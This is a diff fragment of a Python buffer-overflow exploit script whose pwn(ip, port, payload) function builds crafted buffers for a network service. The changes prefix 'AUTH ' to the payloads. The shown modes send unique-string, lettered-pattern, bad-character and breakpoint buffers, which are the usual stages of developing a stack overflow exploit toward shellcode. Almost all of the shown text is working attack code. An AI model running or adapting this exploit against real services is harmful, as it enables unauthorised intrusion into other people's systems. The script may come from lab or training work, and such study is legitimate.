@@ -49,10 +49,10 @@ def pwn(ip, port, payload):
     elif payload == 'unique':
         print("[*] Payload set as unique string")
         with open('data/unique_1072byte_string.dat') as unique:
-            buff = unique.read()
+            buff = 'AUTH ' + unique.read()
     elif isinstance(payload, int):
         assert(payload <= 26)
-        buff = ''
+        buff = 'AUTH '
         for letter in range(payload):
             buff += string.ascii_uppercase[letter] * int((buffer_length/payload))
     elif payload == 'test':
@@ -61,7 +61,7 @@ def pwn(ip, port, payload):
                 '\x42' * 4 + '\x43\x44\x45\x46' + '\x47' * 360
     elif payload == 'chars':
         print("[*] Payload set to test for bad chars")
-        buff =  good_chars + A * buffer_length
+        buff =  'AUTH ' + good_chars + A * buffer_length
     elif payload == 'break':
         print("[*] Payload set to breakpoint on entry to shellcode section")
         buff = 'AUTH ' + '\x41' * buffer_length + struct.pack('<L', 0xffffffff) + \
